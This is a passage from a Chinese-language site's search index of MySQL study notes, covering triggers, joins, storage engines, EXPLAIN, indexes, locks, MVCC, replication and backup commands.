每当删除一条学生信息时，自动删除其成绩表上的对应记录。 每当删除一条数据时，在数据库存档表中保留一个备份副本。 触发程序的优点如下： 触发程序的执行是自动的，当对触发程序相关表的数据做出相应的修改后立即执行。 触发程序可以通过数据库中相关的表层叠修改另外的表。 触发程序可以实施比 FOREIGN KEY 约束、CHECK 约束更为复杂的检查和操作。 触发器与表关系密切，主要用于保护表中的数据。\n特别是当有多个表具有一定的相互联系的时候，触发器能够让不同的表保持数据的一致性。 在 MySQL 中，只有执行 INSERT、UPDATE 和 DELETE 操作时才能激活触发器。 在实际使用中，MySQL 所支持的触发器有三种： INSERT 触发器 UPDATE 触发器 DELETE 触发器 INSERT 触发器 在 INSERT 语句执行之前或之后响应的触发器。 使用 INSERT 触发器需要注意以下几点： 在 INSERT 触发器代码内，可引用一个名为 NEW（不区分大小写）的虚拟表来访问被插入的行。 在 BEFORE INSERT 触发器中，NEW 中的值也可以被更新，即允许更改被插入的值（只要具有对应的操作权限）。 对于 AUTO_INCREMENT 列，NEW 在 INSERT 执行之前包含的值是 0，在 INSERT 执行之后将包含新的自动生成值。 UPDATE 触发器 在 UPDATE 语句执行之前或之后响应的触发器。 使用 UPDATE 触发器需要注意以下几点： 在 UPDATE 触发器代码内，可引用一个名为 NEW（不区分大小写）的虚拟表来访问更新的值。 在 UPDATE 触发器代码内，可引用一个名为 OLD（不区分大小写）的虚拟表来访问 UPDATE 语句执行前的值。 在 BEFORE UPDATE 触发器中，NEW 中的值可能也被更新，即允许更改将要用于 UPDATE 语句中的值（只要具有对应的操作权限）。 OLD 中的值全部是只读的，不能被更新。 注解 当触发器设计对触发表自身的更新操作时，只能使用 BEFORE 类型的触发器，AFTER 类型的触发器将不被允许。 DELETE 触发器 在 DELETE 语句执行之前或之后响应的触发器。 使用 DELETE 触发器需要注意以下几点： 在 DELETE 触发器代码内，可以引用一个名为 OLD（不区分大小写）的虚拟表来访问被删除的行。 OLD 中的值全部是只读的，不能被更新。 总体来说，触发器使用的过程中，MySQL 会按照以下方式来处理错误。 若对于事务性表，如果触发程序失败，以及由此导致的整个语句失败，那么该语句所执行的所有更改将回滚； 对于非事务性表，则不能执行此类回滚，即使语句失败，失败之前所做的任何更改依然有效。 若 BEFORE 触发程序失败，则 MySQL 将不执行相应行上的操作。 若在 BEFORE 或 AFTER 触发程序的执行过程中出现错误，则将导致调用触发程序的整个语句失败。 仅当 BEFORE 触发程序和行操作均已被成功执行，MySQL 才会执行AFTER触发程序。 触发器的执行顺序 我们建立的数据库一般都是 InnoDB 数据库，其上建立的表是事务性表，也就是事务安全的。\n这时，若SQL语句或触发器执行失败，MySQL 会回滚事务，有： 如果 BEFORE 触发器执行失败，SQL 无法正确执行 SQL 执行失败时，AFTER 型触发器不会触发 AFTER 类型的触发器执行失败，SQL 会回滚 MySQL创建触发器（CREATE TRIGGER） 触发器是与 MySQL数据表有关的数据库对象，在满足定义条件时触发，并执行触发器中定义的语句集合。\n触发器的这种特性可以协助应用在数据库端确保数据的完整性。 基本语法 在 MySQL 5.7 中，可以使用 CREATE TRIGGER 语句创建触发器。 语法格式如下: CREATE <触发器名> < BEFORE | AFTER >\n<INSERT | UPDATE | DELETE >\nON <表名> FOR EACH Row<触发器主体> 语法说明如下 触发器名 触发器的名称，触发器在当前数据库中必须具有唯一的名称。\n如果要在某个特定数据库中创建，名称前面应该加上数据库的名称。 INSERT | UPDATE | DELETE 触发事件，用于指定激活触发器的语句的种类。 注意：三种触发器的执行时间如下。 INSERT：将新行插入表时激活触发器。\n例如，INSERT 的 BEFORE 触发器不仅能被 MySQL 的 INSERT 语句激活，也能被 LOAD DATA 语句激活。 DELETE： 从表中删除某一行数据时激活触发器，例如 DELETE 和 REPLACE 语句。 UPDATE：更改表中某一行数据时激活触发器，例如 UPDATE 语句。 BEFORE | AFTER BEFORE 和 AFTER，触发器被触发的时刻，表示触发器是在激活它的语句之前或之后触发。\n若希望验证新数据是否满足条件，则使用 BEFORE 选项；\n若希望在激活触发器的语句执行之后完成几个或更多的改变，则通常使用 AFTER 选项。 表名 与触发器相关联的表名，此表必须是永久性表，不能将触发器与临时表或视图关联起来。\n在该表上触发事件发生时才会激活触发器。\n同一个表不能拥有两个具有相同触发时刻和事件的触发器。\n例如，对于一张数据表，不能同时有两个 BEFORE UPDATE 触发器，\n但可以有一个 BEFORE UPDATE 触发器和一个 BEFORE INSERT 触发器，\n或一个 BEFORE UPDATE 触发器和一个 AFTER UPDATE 触发器。 触发器主体 触发器动作主体，包含触发器激活时将要执行的 MySQL 语句。\n如果要执行多个语句，可使用 BEGIN…END 复合语句结构。 FOR EACH ROW 一般是指行级触发，对于受触发事件影响的每一行都要激活触发器的动作。\n例如，使用 INSERT 语句向某个表中插入多行数据时，触发器会对每一行数据的插入都执行相应的触发器动作。 注解 每个表都支持 INSERT、UPDATE 和 DELETE 的 BEFORE 与 AFTER，因此每个表最多支持 6 个触发器。\n每个表的每个事件每次只允许有一个触发器。单一触发器不能与多个事件或多个表关联。 另外，在 MySQL 中，若需要 查看数据库中已有的触发器，则可以使用 SHOW TRIGGERS 语句。 注解 如果触发器的逻辑块只包含一个语句，您可以省略 BEGIN 和 END 关键字。 创建 BEFORE 类型触发器 以, t1表为例: mysql> show create table t1 \\G;\n*************************** 1. row ***************************\n      Table: t1\nCreate Table: CREATE TABLE `t1` (\n  `id` int NOT NULL,\n  `name` varchar(255) DEFAULT NULL,\n  `age` int DEFAULT NULL,\n  `birth` datetime DEFAULT NULL,\n  PRIMARY KEY (`id`)\n) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_0900_ai_ci\n1 row in set (0.00 sec)\n\nERROR:\nNo query specified 关于此表创建可见 TableCreate ,\n后续用例都以此表操作. 查看表信息: mysql> desc t1;\n+-------+--------------+------+-----+---------+-------+\n| Field | Type         | Null | Key | Default | Extra |\n+-------+--------------+------+-----+---------+-------+\n| id    | int          | NO   | PRI | NULL    |       |\n| name  | varchar(255) | YES  |     | NULL    |       |\n| age   | int          | YES  |     | NULL    |       |\n| birth | datetime     | YES  |     | NULL    |       |\n+-------+--------------+------+-----+---------+-------+\n4 rows in set (0.00 sec) 创建一个触发器, 在插入表之前, 统计计算下人数, 总年龄, 平均年龄: mysql> delimiter $$\nmysql> create trigger AvgAge\n    ->   before insert\n    ->   on t1\n    -> for each row\n    -> begin\n    ->   set @nums = @nums + 1;\n    ->   set @sumAge = @sumAge + new.age;\n    ->   set @sumAvgAge = @sumAge / @nums;\n    -> end $$\nQuery OK, 0 rows affected (0.02 sec)\n\nmysql> delimiter ;\nmysql> 使用, 需要先定义一下变量: mysql> set @nums=0, @sumAge=0, @sumAvgAge=0;\nQuery OK, 0 rows affected (0.00 sec)\n\nmysql> insert into t1\n    -> values\n    ->   (1, \"bob\", 26, \"1999-2-2\"),\n    ->   (2, \"tom\", 28, \"1998-4-4\");\nQuery OK, 2 rows affected (0.01 sec)\nRecords: 2  Duplicates: 0  Warnings: 0\n\nmysql> select @nums, @sumAge, @sumAvgAge;\n+-------+---------+--------------+\n| @nums | @sumAge | @sumAvgAge   |\n+-------+---------+--------------+\n|     2 |      54 | 27.000000000 |\n+-------+---------+--------------+\n1 row in set (0.00 sec) 创建 AFTER 类型触发器 MySQL修改和删除触发器（DROP TRIGGER） 修改触发器可以通过删除原触发器，再以相同的名称创建新的触发器。 基本语法 与其他MySQL数据库对象一样，可以使用 DROP 语句将触发器从数据库中删除。 语法格式如下: DROP TRIGGER [ IF EXISTS ] [数据库名] <触发器名> 语法说明如下： 触发器名 要删除的触发器名称。 数据库名 可选项。指定触发器所在的数据库的名称。若没有指定，则为当前默认的数据库 权限 执行 DROP TRIGGER 语句需要 SUPER 权限。 IF EXISTS 可选项。避免在没有触发器的情况下删除触发器。 注解 删除一个表的同时，也会自动删除该表上的触发器。\n另外，触发器不能更新或覆盖，为了修改一个触发器，必须先删除它，再重新创建。 删除触发器 使用 DROP TRIGGER 语句可以删除 MySQL 中已经定义的触发器。 参考: MySQL 之触发器（创建/修改、删除CREATE/DROP TRIGGER)","tags":"数据库","url":"/yq-docs-database-mysql-Conceptual-foundation-trigger.html","loc":"/yq-docs-database-mysql-Conceptual-foundation-trigger.html"},{"title":"表内外连接","text":"假设有两个表a, b: CREATE TABLE `a_table` (\n  `a_id` int(11) DEFAULT NULL,\n  `a_name` varchar(10) DEFAULT NULL,\n  `a_part` varchar(10) DEFAULT NULL\n) ENGINE=InnoDB DEFAULT CHARSET=utf8\n\nCREATE TABLE `b_table` (\n  `b_id` int(11) DEFAULT NULL,\n  `b_name` varchar(10) DEFAULT NULL,\n  `b_part` varchar(10) DEFAULT NULL\n) ENGINE=InnoDB DEFAULT CHARSET=utf8 表数据 内连接 内连接, 语法: inner join on 用例: select * from a_table a inner join b_table b on a.a_id = b.b_id; 结果 说明: 结果只会包含满足 a.a_id = b.b_id.\n相当于两个表的交集. 左连接（左外连接） 语法: left join on / left outer join on 用例: select * from a_table a left join b_table b on a.a_id = b.b_id; 结果 left join 是left outer join的简写，它的全称是左外连接，是外连接中的一种 左连接会显示主表（左表）的全部记录，右表只会显示符合连接条件的数据，不符合的为null 右连接（右外连接） 关键字: right join on / right outer join on 语句: select * from a_table a right outer join b_table b on a.a_id = b.b_id; 执行结果 right join是right outer join的简写，它的全称是右外连接，是外连接中的一种。 与左(外)连接相反，右(外)连接，显示右表（主表）所有记录，左表只会显示符合连接条件的数据，不符合的为null 全外连接(mysql不支持) 关键字: full [outer] join 相当于返回两个表的并集, 没有的为空 MySQL暂不支持这种语句，不过可以使用union将两个结果集\"堆一起\"，\n利用左连接，右连接分两次将数据取出，然后用union将数据合并去重。 参考:: MySQL多表查询与左连接、右连接、内连接、全连接 【MySQL】连接查询 以及 on、where、Having的区别 UNION 这个不属于连接, 不过容易混, 所以放在这 合并多个结果集为一个 MySQL UNION 操作符用于连接两个以上的 SELECT 语句的结果组合到一个结果集合，并去除重复的行。\nUNION 操作符必须由两个或多个 SELECT 语句组成，每个 SELECT 语句的列数和对应位置的数据类型必须相同: SELECT column1, column2, ...\nFROM table1\nWHERE condition1\nUNION\nSELECT column1, column2, ...\nFROM table2\nWHERE condition2\n[ORDER BY column1, column2, ...]; 参数说明: column1, column2, ... 是你要选择的列的名称，如果使用 * 表示选择所有列。 table1, table2, ... 是你要从中查询数据的表的名称。 condition1, condition2, ... 是每个 SELECT 语句的过滤条件，是可选的。 ORDER BY 子句是一个可选的子句，用于指定合并后的结果集的排序顺序。 将选择客户表和供应商表中所有城市的唯一值，并按城市名称升序排序: SELECT city FROM customers\nUNION\nSELECT city FROM suppliers\nORDER BY city; 还有个 UNION ALL , 也是合并结果集, 但是不会去重. 总结 UNION 语句：用于将不同表中相同列中查询的数据展示出来；（不包括重复数据） UNION ALL 语句：用于将不同表中相同列中查询的数据展示出来；（包括重复数据） 使用形式如下:: SELECT 列名称 FROM 表名称 UNION SELECT 列名称 FROM 表名称 ORDER BY 列名称；\nSELECT 列名称 FROM 表名称 UNION ALL SELECT 列名称 FROM 表名称 ORDER BY 列名称；","tags":"数据库","url":"/yq-docs-database-mysql-Connection-inside-and-outside-the-table.html","loc":"/yq-docs-database-mysql-Connection-inside-and-outside-the-table.html"},{"title":"数据库引擎","text":"MyISAM引擎 数据库表存储文件分成三类: table_name.frm  表结构 table_name.MYI  表索引 table_name.MYD  表数据 即索引文件和数据文件是分离的(非聚集) 索引的叶子结点存储的是数据的地址 InnoDB 数据库表存储文件分成两类: table_name.frm  表结构 (8.0统一放到系统表的idb里面了貌似) table_name.idb  表索引和数据 即索引文件和数据文件是 聚集 的 索引的叶子结点存储的是数据本身(聚集索引包含完整的数据记录) 通常说的聚集索引就是指的这个 .idb 非主键索引存储的是主键索引 , 为了保持一致性与节省空间.\n所以从非主键索引查询, 还是会回表查主键找数据. 一些常见问题 为什么 InnoDB 建议必须建主键, 且建议使用整型的 自增主键 ? 以下原因: InnoDB 会有一个聚集索引, 如果不建主键, 数据库自己也会维护一个不可见的主键列(叫row_id, 不然没法建B+树),\n因为不可见, 开发者自己也没法用, 所以还不如自己建 使用自增主键, 主要是为了减小增加数据时候, 索引B+树会进行一个扩充,\n如果不是自增, 会有B+树插入的额外开销, 浪费数据库性能 自增主键使用整型, 是因为比较是最快的且占空间较小. 如果是UUID, 每一位都要比","tags":"数据库","url":"/yq-docs-database-mysql-Database-engine.html","loc":"/yq-docs-database-mysql-Database-engine.html"},{"title":"explain 优化","text":"explain 查询优化神器 EXPLAIN语句的基本语法如下: explain select select_option select_options是SELECT语句的查询选项，包括FROM WHERE子句等 输出结果列选项含义: id SELECT识别符.\n这是SELECT的查询序列号, 表示查询中执行select子句或操作表的顺序,\nid相同，执行顺序从上到下, id不同，id值越大执行优先级越高; select_type 表示SELECT语句的类型. 它可以是以下几种取值： SIMPLE:表示简单查询，其中不包括连接查询和子查询； PRIMARY:表示主查询，或者是最外层的查询语句，最外层查询为PRIMARY，也就是最后加载的就是PRIMARY； UNION:表示连接查询的第2个或后面的查询语句， 不依赖于外部查询的结果集 DEPENDENT UNION:连接查询中的第2个或后面的SELECT语句，依赖于外面的查询； UNION RESULT:连接查询的结果； SUBQUERY:子查询中的第1个SELECT语句；不依赖于外部查询的结果集 DEPENDENT SUBQUERY:子查询中的第1个SELECT，依赖于外面的查询； DERIVED:导出表的SELECT（FROM子句的子查询）,MySQL会递归执行这些子查询，把结果放在临时表里。 DEPENDENT DERIVED:派生表依赖于另一个表 MATERIALIZED:物化子查询 UNCACHEABLE SUBQUERY:子查询，其结果无法缓存，必须针对外部查询的每一行重新进行评估 UNCACHEABLE UNION:UNION中的第二个或随后的 select 查询，属于不可缓存的子查询 table 表示查询的表 partitions 查询将从中匹配记录的分区。该值适用NULL于未分区的表 type 表示表的连接类型 system: 该表是仅有一行的系统表。这是const连接类型的一个特例 const: 数据表最多只有一个匹配行，它将在查询开始时被读取，并在余下的查询优化中作为常量对待。\nconst表查询速度很快，因为只读取一次,const用于使用常数值比较PRIMARY KEY或UNIQUE索引的所有部分的场合。 eq_ref:对于每个来自前面的表的行组合，从该表中读取一行,\n可以用于使用=运算符进行比较的索引列 .\n比较值可以是常量，也可以是使用在此表之前读取的表中列的表达式 ref:对于来自前面的表的任意行组合，将从该表中读取所有匹配的行，ref可以用于使用\"＝\"或\"＜＝＞\"操作符的带索引的列。 fulltext:使用FULLTEXT 索引执行联接 ref_or_null:这种连接类型类似于ref，但是除了MySQL还会额外搜索包含NULL值的行。此联接类型优化最常用于解析子查询 index_merge:此联接类型指示使用索引合并优化。在这种情况下，key输出行中的列包含使用的索引列表，并key_len包含使用的索引 的最长键部分的列表 unique_subquery:类型替换 以下形式的eq_ref某些 IN子查询,unique_subquery 只是一个索引查找函数，它完全替代了子查询以提高效率。 index_subquery:连接类型类似于 unique_subquery。它代替IN子查询,但只适合子查询中的非唯一索引 range:只检索给定范围的行，使用一个索引来选择行。key列显示使用了哪个索引。key_len包含所使用索引的最长关键元素。当使用＝、＜＞、＞、＞＝、＜、＜＝、IS NULL、＜＝＞、BETWEEN或者IN操作符用常量比较关键字列时，类型为range index:该index联接类型是一样的 ALL，只是索引树被扫描。这发生两种方式：1、如果索引是查询的覆盖索引，并且可用于满足表中所需的所有数据，则仅扫描索引树。在这种情况下，Extra列显示为 Using index，2、使用对索引的读取执行全表扫描，以按索引顺序查找数据行。 Uses index没有出现在 Extra列中。 ALL:对于前面的表的任意行组合进行完整的表扫描 possible_keys 指出MySQL能使用哪个索引在该表中找到行.\n若该列是NULL，则没有相关的索引.\n在这种情况下，可以通过检查WHERE子句看它是否引用某些列或适合索引的列来提高查询性能.\n如果是这样，可以创建适合的索引来提高查询的性能。 kye 表示查询实际使用的索引，如果没有选择索引，该列的值是NULL.\n要想强制MySQL使用或忽视possible_keys列中的索引，在查询中使用FORCE INDEX、USE INDEX或者IGNORE INDEX key_len 表示MySQL选择的索引字段按字节计算的长度，若键是NULL，则长度为NULL.\n注意，通过key_len值可以确定MySQL将实际使用一个多列索引中的几个字段 ref 表示使用哪个列或常数与索引一起来查询记录。 rows 显示MySQL在表中进行查询时必须检查的行数。 Extra 表示MySQL在处理查询时的详细信息 参考: MySQL索引原理及慢查询优化","tags":"数据库","url":"/yq-docs-database-mysql-Explain-optimization.html","loc":"/yq-docs-database-mysql-Explain-optimization.html"},{"title":"索引数据结构","text":"B+树 Mysql索引采取的是 B+树 ,\n可参考 树 对于 B+树 , 每个节点的每一个索引值, 只有到达叶子节点时候, 才会有当前对应的行数据\n(非叶子节点不存储data, 只放索引, 可以放更多的索引) 索引值可重复, 但是行数据只有叶子节点才有 叶子节点包含所有索引 叶子节点间用指针相邻连接(提高区间访问性能) 一般每一个索引节点的数据会放满一页, 一般是 16KB\n查询每一页大小: show GLOBAL_STATUS like 'Innodb_page_size' Hash 在Mysql表中新建索引时, 还可选择索引类型为 Hash表 ,\n对于单查询时非常快的 但是只支持 = , IN , 不支持范围查询,\n且需要处理Hash冲突 FULL TEXT","tags":"数据库","url":"/yq-docs-database-mysql-Indexing-data-structure.html","loc":"/yq-docs-database-mysql-Indexing-data-structure.html"},{"title":"锁","text":"锁粒度 行级锁\n表级锁\n页级锁 性能 乐观锁\n悲观锁 是否独占 读锁(共享锁), 阻塞写\n写锁(排他锁), 阻塞读写\n意向锁(Intention Lock) 其他锁 间隙锁(Gap Lock)\n临键锁(Next-key Locks)","tags":"数据库","url":"/yq-docs-database-mysql-Lock.html","loc":"/yq-docs-database-mysql-Lock.html"},{"title":"MVCC","text":"MVCC，即Multi-Version  Concurrency Control （多版本并发控制）。\n它是一种并发控制的方法，一般在数据库管理系统中，\n实现对数据库的并发访问，在编程语言中实现事务内存: 通俗的讲，数据库中同时存在多个版本的数据，\n并不是整个数据库的多个版本，而是某一条记录的多个版本同时存在，\n在某个事务对其进行操作的时候，需要查看这一条记录的隐藏列事务版本id，\n比对事务id并根据事物隔离级别去判断读取哪个版本的数据。 隔离级别见: 事务 数据库隔离级别读已提交、可重复读 都是基于MVCC实现的，\n相对于加锁简单粗暴的方式，它用更好的方式去处理读写冲突，能有效提高数据库并发性能。 事务版本号 事务每次开启前，都会从数据库获得一个自增长的事务ID，\n可以从事务ID判断事务的执行先后顺序。这就是事务版本号。 隐式字段 对于InnoDB存储引擎，每一行记录都有两个隐藏列trx_id、roll_pointer，\n如果表中没有主键和非NULL唯一键时，则还会有第三个隐藏的主键列row_id。 列名 是否必须 描述 row_id 否 单调递增的行ID，不是必需的，占用6个字节 trx_id 是 记录操作该数据事务的事务ID roll_pointer 是 这个隐藏列就相当于一个指针，指向回滚段的undo日志 undo log undo log，回滚日志，用于记录数据被修改前的信息。\n在表记录修改之前，会先把数据拷贝到undo log里，\n如果事务回滚，即可以通过undo log来还原数据。 可以这样认为，当delete一条记录时，\nundo log 中会记录一条对应的insert记录，\n当update一条记录时，它记录一条对应相反的update记录。 undo log有什么用途呢？ 事务回滚时，保证原子性和一致性。\n用于MVCC快照读。 版本链 多个事务并行操作某一行数据时，不同事务对该行数据的修改会产生多个版本，\n然后通过回滚指针（roll_pointer），连成一个链表，这个链表就称为版本链。\n如下： 其实，通过版本链，我们就可以看出事务版本号、表格隐藏的列和undo log它们之间的关系。\n我们再来小分析一下。 假设现在有一张core_user表，表里面有一条数据,id为1，名字为孙权 现在开启一个事务A: 对core_user表执行update core_user set name =\"曹操\" where id=1,会进行如下流程操作 首先获得一个事务ID=100 把core_user表修改前的数据,拷贝到undo log 修改core_user表中，id=1的数据，名字改为曹操 把修改后的数据事务Id=101改成当前事务版本号，并把roll_pointer指向undo log数据地址。 快照读和当前读 快照读 读取的是记录数据的可见版本（有旧的版本）。\n不加锁,普通的select语句都是快照读,\n如: select * from core_user where id > 2; 当前读 读取的是记录数据的最新版本，\n显式加锁的都是当前读: select * from core_user where id > 2 for update;\nselect * from account where id>2 lock in share mode; Read View Read View是什么呢？\n它就是事务执行SQL语句时，产生的读视图。\n实际上在innodb中，每个SQL语句执行前都会得到一个Read View。 Read View有什么用呢？\n它主要是用来做可见性判断的，即判断当前事务可见哪个版本的数据 Read View是如何保证可见性判断的呢？我们先看看Read view 的几个重要属性 m_ids 当前系统中那些活跃(未提交)的读写事务ID, 它数据结构为一个List。 min_limit_id 表示在生成ReadView时，当前系统中活跃的读写事务中最小的事务id，即m_ids中的最小值。 max_limit_id 表示生成ReadView时，系统中应该分配给下一个事务的id值。 creator_trx_id 创建当前read view的事务ID Read view 匹配条件规则如下： 如果数据事务ID trx_id < min_limit_id ，表明生成该版本的事务在生成Read View前，\n已经提交(因为事务ID是递增的)，所以该版本可以被当前事务访问。 如果 trx_id >= max_limit_id ，表明生成该版本的事务在生成ReadView后才生成，所以该版本不可以被当前事务访问。 如果 min_limit_id =<trx_id< max_limit_id , 需腰分3种情况讨论 如果m_ids包含trx_id,则代表Read View生成时刻，这个事务还未提交，\n但是如果数据的trx_id等于creator_trx_id的话，表明数据是自己生成的，因此是可见的。 如果m_ids包含trx_id，并且trx_id不等于creator_trx_id，则 Read View生成时，\n事务未提交，并且不是自己生产的，所以当前事务也是看不见的； 如果m_ids不包含trx_id，则说明你这个事务在Read View生成之前就已经提交了，修改的结果，当前事务是能看见的。 MVCC实现原理分析 查询一条记录，基于MVCC，是怎样的流程 获取事务自己的版本号，即事务ID 获取Read View 查询得到的数据，然后Read View中的事务版本号进行比较。 如果不符合Read View的可见性规则， 即就需要Undo log中历史快照; 最后返回符合规则的数据 InnoDB 实现MVCC，是通过 Read View + Undo Log 实现的，\nUndo Log 保存了历史快照，Read View可见性规则帮助判断当前版本的数据是否可见。 读已提交（RC）隔离级别，存在不可重复读问题的分析历程 创建core_user表，插入一条初始化数据,如下 隔离级别设置为读已提交（RC），事务A和事务B同时对core_user表进行查询和修改操作: 事务A: select * fom core_user where id=1\n事务B: update core_user set name =\"曹操\" 执行流程如下： 最后事务A查询到的结果是，name=曹操的记录，我们基于MVCC，\n来分析一下执行流程： A开启事务，首先得到一个事务ID为100 B开启事务，得到事务ID为101 事务A生成一个Read View，read view对应的值如下 变量 值 m_ids 100，101 max_limit_id 102 min_limit_id 100 creator_trx_id 100 然后回到版本链：开始从版本链中挑选可见的记录 由图可以看出，最新版本的列name的内容是孙权，\n该版本的trx_id值为100。开始执行read view可见性规则校验: min_limit_id(100)=<trx_id（100）<102;\ncreator_trx_id = trx_id =100; 由此可得，trx_id=100的这个记录，当前事务是可见的。所以查到是name为孙权的记录。 事务B进行修改操作，把名字改为曹操。\n把原数据拷贝到undo log,然后对数据进行修改，\n标记事务ID和上一个数据版本在undo log的地址。 提交事务 事务A再次执行查询操作，新生成一个Read View，Read View对应的值如下 变量 值 m_ids 100 max_limit_id 102 min_limit_id 100 creator_trx_id 100 然后再次回到版本链：从版本链中挑选可见的记录： 从图可得，最新版本的列name的内容是曹操，该版本的trx_id值为101。开始执行Read View可见性规则校验: min_limit_id(100)=<trx_id（101）<max_limit_id（102); 但是,trx_id=101，不属于m_ids集合 因此，trx_id=101这个记录，对于当前事务是可见的。所以SQL查询到的是name为曹操的记录。\n综上所述，在读已提交（RC）隔离级别下，同一个事务里，两个相同的查询，读取同一条记录（id=1），\n却返回了不同的数据（第一次查出来是孙权，第二次查出来是曹操那条记录），因此RC隔离级别，存在不可重复读并发问题。 参考: https://juejin.cn/post/7016165148020703246","tags":"数据库","url":"/yq-docs-database-mysql-MVCC.html","loc":"/yq-docs-database-mysql-MVCC.html"},{"title":"主从同步","text":"用处:\n比如使用 主从架构 (binlog) 实现 读写分离 业务代码层面, 读写分离只关注路由到读的库, 还是写的库. 出了物理上的从库,\n还可以使用其他组件\n比如 ClickHouse 伪装作为从库(还是用的binlog的形式实现, 单机读性能强),\n还有 Canal 与 MQ 结合 主从复制原理 流程 master数据写入，更新binlog master创建一个dump线程向slave推送binlog slave连接到master的时候，会创建一个IO线程接收binlog，并记录到 relay log(中继日志) 中 slave再开启一个sq|线程读取 relay log 事件并在slave执行，完成同步 slave记录自己的binglog 主从同步延迟处理 主从同步延迟的原因 当数据库主库有较大更新并发操作时，可能会导致主从同步延迟，\n因为从库里面读取 binlog 的线程仅有一个，\n当某个 SQL 在从库上执行的时间稍长或者由于某个SQL 要进行锁表就会导致主从同步延迟，\n主库的SQL大量积压，未被同步到从库里。这就导致了主从不一致，也就是主从延迟。 主从同步延迟的解决办法 解决主从复制延迟有几种常见的方法： 写操作后的读操作指定发给数据库主库 例如，注册账号完成后，登录时读取账号的读操作也发给数据库主库。\n这种方式和业务强绑定，对业务的侵入和影响较大，如果哪个新来的程序员不知道这样写代码，就会导致一个bug。 读从库失败后再读一次主库 这就是通常所说的\"二次读取\"，二次读取和业务无绑定，只需要对底层数据库访问的 API 进行封装即可，\n实现代价较小，不足之处在于如果有很多二次读取，将大大增加主库的读操作压力。\n例如，黑客暴力破解账号，会导致大量的二次读取操作，主库可能顶不住读操作的压力从而崩溃。 关键业务读写操作全部指向主库，非关键业务采用读写分离 例如，对于一个用户管理系统来说，注册+登录的业务读写操作全部访问主库，\n用户的介绍、爱好、等级等业务，可以采用读写分离，\n因为即使用户改了自己的自我介绍，在查询时却看到了自我介绍还是旧的，业务影响与不能登录相比就小很多，业务上一般可以接受。","tags":"数据库","url":"/yq-docs-database-mysql-Master-and-Synchronous.html","loc":"/yq-docs-database-mysql-Master-and-Synchronous.html"},{"title":"mysql 备份方案","text":"全量备份 方案一： sql实现 sql 语句实现: mysqldump --lock-all-tables --flush-logs --master-data=2 -u $username -p $password $database_name > $bak_file 参数解释 --lock-all-tables 对于InnoDB将替换为 --single-transaction。\n该选项在导出数据之前提交一个 BEGIN SQL语句，\nBEGIN 不会阻塞任何应用程序且能保证导出时数据库的一致性状态。\n它只适用于事务表，例如 InnoDB 和 BDB。\n本选项和 --lock-tables 选项是互斥的，因为 LOCK TABLES 会使任何挂起的事务隐含提交。\n要想导出大表的话，应结合使用 --quick 选项。 --flush-logs 结束当前日志，生成并使用新日志文件 --master-data --master-data=2 .\n该选项将会在输出SQL中记录下完全备份后新日志文件的名称，用于日后恢复时参考，\n例如输出的备份SQL文件中含有: CHANGE MASTER TO MASTER_LOG_FILE='MySQL-bin.000002', MASTER_LOG_POS=106; --all-databases 备份所有数据库，备份单个库直接跟库名 --databases 指定多个数据库 --quick , -q 该选项在导出大表时很有用，\n它强制 MySQLdump 从服务器查询取得记录直接输出而不是取得所有记录后将它们缓存到内存中。 --ignore-table 忽略某个数据表，如 --ignore-table test.user 忽略数据库test里的user表 注解 对于mysqldump备份的数据, 可以直接进数据库执行: source bak.sql 恢复 命令大小写不敏感, 库名大小写敏感 方案二： django角度实现 备份: python manage.py dumpdata $app >$bak_file 恢复: python manage.py loaddata $bak_file 方案三： oracle商业软件mysqlbackup实现（可能需付费下载） 完整备份: mysqlbackup --defaults-file=$mysqld_cnf_file --socket=$socket_file --with-timestamp --user=$user --password=$password --backup-dir=$backup_dir backup-and-apply-log --defaults-file mysql配置文件目录 --socket socket目录 （默认不用输入，一般会找默认的） --with-timestamp 以时间来生成文件名 --user 用户 --password 密码 --backup-dir 备份文件目录 backup-and-apply-log 备份并检查日志文件 完整备份恢复: # copy-back 把back-dir复制到datadir中\nmysqlbackup --defaults-file=$mysqld_cnf_file --datadir=$sys_mysql_data_dir --backup-dir=$backup_dir copy-back --datadir 当前数据库相应的数据文件所在位置 --backup-dir 当前备份文件所在目录 copy-back 把back-dir复制到datadir中 注解 在恢复时报错未找到innodb配置，两种方法解决， 第一种在mysqld.cnf添加innodb的配置文件，具体配置在备份文件backup-my.cnf中， 第二种方法直接将 --defaults-file指定到备份文件的backup-my.cnf目录 在还原后，修改mysql这个目录和mysql里面的文件内容都把权限修改成mysql,否mysql无法启动 增量备份 方案一： bin-log 增量备份 备份大概顺序 确认数据库开启 log_bin 链接数据库刷新日志，执行 flush-logs 备份旧的 bin-log 文件 恢复备份大概顺序 还原旧的 bin-log 文件 执行mysqlbinlog 恢复，\n如: mysqlbinlog --no-defaults $log_bin_file 注解 若需定时操作，linux可加crontab定时器 方案二：mysqlbackup实现 说明，mysqlbackup是mysql企业版功能，oracle商业软件，需要付费使用 下载地址: https://www.mysql.com/downloads/ 备份 多文件备份流程（推荐使用多文件的，就是恢复需要整理成单文件，此处就不写单文件流程了，基本一致） 第一次增量备份: mysqlbackup --defaults-file=$socket_file --user=$user --password --with-timestamp  --incremental --incremental-base=dir:$base_bak_dir --incremental-backup-dir=$true_bak_dir backup\n\n--incremental 表示增量备份\n--incremental-base 基于哪个备份的备份\n--incremental-backup-dir 增量备份的备份存放目录 第二次增量备份 mysqlbackup --defaults-file=$socket_file --with-timestamp --user=$user --password --incremental --incremental-base=dir:$base_bak_dir --incremental-backup-dir=$true_bak_dir backup 注解 第二次 incremental-base 的位置是第一次增量备份的位置 恢复增量备份 使用apply-log将完整备份做成最终备份: mysqlbackup --backup-dir=$res_bak_file apply-log 将第一次增量备份备份完整备份中: mysqlbackup --incremental-backup-dir=$first_bak_dir --backup-dir=$res_bak_file apply-incremental-backup 将第二次增量备份备份到完整备份中: mysqlbackup --incremental-backup-dir=$second_bak_dir --backup-dir=$res_bak_file apply-incremental-backup 物理还原: mysqlbackup --defaults-file=/etc/mysql/mysql.cond.d/mysqld.cnf --backup-dir=$res_bak_file copy-back 注解 apply-incremental-backup 每一个增量备份刷新日志 方案三：开源工具 xtraback 实现增量备份 xtraback优点 备份速度快，物理备份可靠 备份过程不会打断正在执行的事务（无需锁表） 能够基于压缩等功能节约磁盘空间和流量 自动备份校验 还原速度快 可以流传将备份传输到另外一台机器上 在不增加服务器负载的情况备份数据 下载地址: https://www.percona.com/downloads/XtraBackup/LATEST/ 说明 Xtrabackup中主要包含两个工具： 